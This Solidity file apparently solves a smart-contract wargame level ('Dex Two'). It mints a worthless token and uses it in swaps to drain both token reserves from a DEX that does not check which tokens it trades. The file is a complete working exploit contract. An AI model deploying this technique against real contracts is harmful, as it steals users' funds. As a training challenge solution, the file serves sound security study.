// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/**
 * @title 23. DEX
 * @dev Drain all 2 tokens from the contract.
 */

interface IDexTwo {
    function token1() external returns (address);

    function token2() external returns (address);

    function swap(address from, address to, uint256 amount) external;

    function approve(address spender, uint256 amount) external;

    function balanceOf(
        address token,
        address account
    ) external view returns (uint256);
}

contract FreeToken is ERC20 {
    constructor(address _dexterTwo) ERC20("FreeToken", "FTK") {
        _mint(_dexterTwo, 10000000 * 10 ** decimals());
    }
}

contract DexterTwo {
    IDexTwo private immutable dexTwo;
    address private immutable token1;
    address private immutable token2;
    address private freeToken;

    constructor(address _dexTwo) {
        dexTwo = IDexTwo(_dexTwo);
        token1 = dexTwo.token1();
        token2 = dexTwo.token2();
    }

    // 1. Set address of our freeToken
    function setFreeToken(address _freeToken) public {
        freeToken = _freeToken;
    }

    function attack() public {
        dexTwo.approve(address(dexTwo), type(uint256).max);
        IERC20(freeToken).approve(address(dexTwo), type(uint256).max);

        // 2. Send 100 freeToken, then empty the reserves of token1
        IERC20(freeToken).transfer(address(dexTwo), 100);
        dexTwo.swap(freeToken, token1, 100);

        // 3. Next, empty the reserves of token2
        // The contract has now 200 freeTokens and 100 token2
        // x in | 200 - 100 | 100 out (x*100/200)=100 so: x=100/0.5 so: x=200
        dexTwo.swap(freeToken, token2, 200);

        require(
            IERC20(token1).balanceOf(address(dexTwo)) == 0 &&
                IERC20(token2).balanceOf(address(dexTwo)) == 0,
            "Hack failed!"
        );
    }
}
